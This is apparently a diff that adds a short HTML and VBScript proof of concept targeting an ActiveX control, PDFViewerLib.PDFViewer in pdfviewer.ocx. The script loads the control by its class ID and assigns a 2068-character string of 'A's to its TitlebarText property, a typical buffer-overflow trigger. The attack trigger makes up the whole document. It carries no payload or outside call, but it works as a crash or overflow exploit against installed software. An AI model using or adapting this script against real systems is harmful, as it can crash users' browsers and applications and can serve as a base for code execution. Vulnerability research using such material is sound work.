@@ -1,0 +1,10 @@
+<object classid='clsid:44A8091F-8F01-43B7-8CF7-4BBA71E61E04' id='target' />
+<script language='vbscript'>
+targetFile = "C:\Program Files\PDFViewer\pdfviewer.ocx"
+prototype  = "Invoke_Unknown TitlebarText As String"
+memberName = "TitlebarText"
+progid     = "PDFViewerLib.PDFViewer"
+argCount   = 1
+arg1=String(2068, "A")
+target.TitlebarText = arg1
+</script>  
